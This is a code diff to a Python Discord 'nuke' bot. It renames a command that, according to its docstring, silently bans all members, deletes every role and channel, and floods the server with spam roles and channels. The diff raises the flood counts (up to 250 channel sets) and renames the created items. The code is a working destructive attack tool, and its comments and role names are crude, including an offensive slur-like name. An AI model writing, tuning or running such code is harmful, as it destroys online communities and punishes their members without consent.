@@ -406,7 +406,7 @@ async def punch(ctx, recipients):
     await ctx.send(embed=em) 
 
 @Ioxide.command()
-async def execute(ctx):
+async def noble(ctx):
         """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates DiscoRape roles\nThen it deletes all channels possible to then make DiscoRape channels"""
         await ctx.message.delete()
 
@@ -427,13 +427,13 @@ async def execute(ctx):
 
         print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Starting to nuke roles")
 
-        for i in range(1, 50):
+        for i in range(1, 75):
             try:
                 await ctx.guild.create_role(
-                    name=f"NUKED BY RAGE {i}"
+                    name=f"Noble Rage {i}"
                 )
                 print(
-                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY RAGE {i}"
+                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role Noble Rage {i}"
                 )
             except Exception as e:
                 print(f"Error while makign role.\n\nError: {e}")
@@ -462,25 +462,25 @@ async def execute(ctx):
         print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Finished banning members")        
         # delete all channels so we can flood that shit lmfao
 
-        for i in range(1, 25):
+        for i in range(1, 250):
             try:
                 await ctx.guild.create_text_channel(
-                    name=f"NUKED-BY-RAGE-{i}-"
+                    name=f"Rages wrld-{i}-"
                 )
                 print(
-                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-RAGE-{i}-"
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! Rages wrld-{i}-"
                 )
                 await ctx.guild.create_voice_channel(
-                    name=f"NUKED BY RAGE {i} "
+                    name=f"Rages VC {i} "
                 )
                 print(
-                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY RAGE {i} "
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! Rages VC {i} "
                 )
                 await ctx.guild.create_category(
-                    name=f"NUKED BY RAGE {i} "
+                    name=f"Rages Guild {i} "
                 )
                 print(
-                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED BY RAGE {i} "
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! Rages Guild {i} "
                     
                 )
             except Exception as e:
